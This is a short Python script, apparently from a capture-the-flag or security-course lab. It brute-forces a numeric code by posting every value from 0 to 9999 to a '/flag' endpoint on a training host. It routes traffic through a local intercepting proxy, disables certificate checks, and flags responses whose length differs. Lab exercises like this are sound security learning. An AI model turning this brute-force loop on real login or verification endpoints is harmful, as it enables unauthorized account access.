import requests
import re

proxies = {
  'https': 'http://127.0.0.1:8080',
}
requests.packages.urllib3.disable_warnings() 
 
headers = {
"Host": "quoccaair-ff.quoccacorp.com"
  }
for i in range(10000):
    print("Trying: ", i,end="\r")
    r = requests.post("https://quoccaair-ff.quoccacorp.com/flag", headers=headers,data={"code":i},proxies=proxies, verify=False)
    #print(r.headers)
    if r.headers["Content-Length"] != '511':
        print()
        print(i)

